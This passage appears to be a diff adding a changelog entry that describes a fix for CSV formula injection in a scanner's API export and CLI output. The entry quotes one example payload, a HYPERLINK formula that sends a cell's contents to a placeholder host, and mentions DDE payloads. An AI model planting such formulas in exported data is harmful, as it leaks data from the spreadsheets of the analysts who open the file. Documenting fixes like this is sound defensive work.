@@ -14,6 +14,33 @@ starting from this file.
 
 ---
 
+## 2026-09-03 — CSV formula injection
+
+Found while pen-testing the findings-export path. CWE-1236.
+
+### siphon-api 2.5.1
+
+- **fix(api): neutralize spreadsheet formula injection in `/v1/findings/export`
+  CSV.** `matched_text` in an exported finding is content the scanner pulled from
+  an uploaded document — attacker-controlled. A cell beginning with `=`, `+`,
+  `-`, `@`, TAB or CR is evaluated as a formula by Excel / Sheets / LibreOffice,
+  so an exported finding like `=HYPERLINK("http://x/?"&A1)` or a DDE payload ran
+  in the analyst's spreadsheet on open. The previous escaper only applied
+  RFC-4180 quoting, which does **not** stop this — the app strips the quotes
+  before evaluating. Dangerous cells are now prefixed with a single quote to
+  force text; delimiter quoting is unchanged. It also now quotes on a lone `\r`.
+
+### siphon 2.2.3
+
+- **fix(cli): apply the same formula-injection defense to `--format csv`.** The
+  CLI escaper detected the dangerous lead characters but only quoted them, which
+  is ineffective for the same reason. It now prefixes a quote. Lower severity
+  than the API path — the CLI CSV carries file paths, formats and error strings
+  rather than matched values — but a crafted filename beginning with `=` was
+  still a live vector.
+
+---
+
 ## 2026-09-03 — pen-test follow-ups
 
 Found while pen-testing the merged hardening wave. The first is a silent DLP
